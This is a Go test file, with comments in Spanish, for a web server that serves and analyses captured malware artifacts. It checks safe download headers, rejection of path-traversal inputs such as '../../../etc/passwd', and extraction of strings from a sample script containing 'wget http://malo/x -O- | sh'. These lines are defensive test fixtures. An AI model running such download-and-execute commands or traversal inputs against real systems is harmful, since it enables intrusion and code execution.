package web

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const hashPrueba = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

func conArtefacto(t *testing.T, contenido []byte) *Servidor {
	t.Helper()
	s := conCuenta(t)
	dir := t.TempDir()
	s.DirDescargas = dir
	if err := os.WriteFile(filepath.Join(dir, hashPrueba), contenido, 0o644); err != nil {
		t.Fatal(err)
	}
	return s
}

// Lo mas importante: el contenido se entrega SIEMPRE como adjunto inerte,
// nunca de forma que el navegador pueda ejecutarlo o interpretarlo.
func TestArtefactoContenidoEsInerte(t *testing.T) {
	cuerpo := []byte("\x7fELFmalware")
	s := conArtefacto(t, cuerpo)

	req := httptest.NewRequest(http.MethodGet, "/api/artefacto/contenido?hash="+hashPrueba, nil)
	w := httptest.NewRecorder()
	s.artefactoContenido(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("codigo = %d", w.Code)
	}
	if ct := w.Header().Get("Content-Type"); ct != "application/octet-stream" {
		t.Errorf("Content-Type = %q, esperaba application/octet-stream", ct)
	}
	if cd := w.Header().Get("Content-Disposition"); !strings.Contains(cd, "attachment") {
		t.Errorf("Content-Disposition = %q, deberia forzar la descarga", cd)
	}
	if w.Header().Get("X-Content-Type-Options") != "nosniff" {
		t.Error("falta X-Content-Type-Options: nosniff")
	}
	if string(w.Body.Bytes()) != string(cuerpo) {
		t.Error("el contenido servido no coincide")
	}
}

// El hash es la unica entrada que construye una ruta a disco: cualquier cosa
// que no sea un SHA-256 hex se rechaza, sin tocar el sistema de ficheros.
func TestArtefactoRechazaRutasMaliciosas(t *testing.T) {
	s := conArtefacto(t, []byte("x"))
	for _, malo := range []string{
		"../../../etc/passwd",
		"..",
		"/etc/passwd",
		hashPrueba + "/../../etc/passwd",
		"AAAA", // hex en mayusculas no vale
		"zz" + hashPrueba[2:],
		"",
	} {
		req := httptest.NewRequest(http.MethodGet,
			"/api/artefacto/contenido?hash="+url.QueryEscape(malo), nil)
		w := httptest.NewRecorder()
		s.artefactoContenido(w, req)
		if w.Code == http.StatusOK {
			t.Errorf("acepto un hash malicioso: %q", malo)
		}
	}
}

func TestArtefactoMetadatos(t *testing.T) {
	s := conArtefacto(t, []byte("#!/bin/sh\nwget http://malo/x -O- | sh\n"))

	req := httptest.NewRequest(http.MethodGet, "/api/artefacto?hash="+hashPrueba, nil)
	w := httptest.NewRecorder()
	s.artefacto(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("codigo = %d", w.Code)
	}
	var d DetalleArtefacto
	if err := json.Unmarshal(w.Body.Bytes(), &d); err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(d.Tipo, "Script") {
		t.Errorf("tipo = %q, esperaba Script", d.Tipo)
	}
	if d.SHA256 != hashPrueba {
		t.Errorf("sha256 = %q", d.SHA256)
	}
	unido := strings.Join(d.Cadenas, "|")
	if !strings.Contains(unido, "wget http://malo/x") {
		t.Errorf("las cadenas no delatan el comando: %v", d.Cadenas)
	}
}
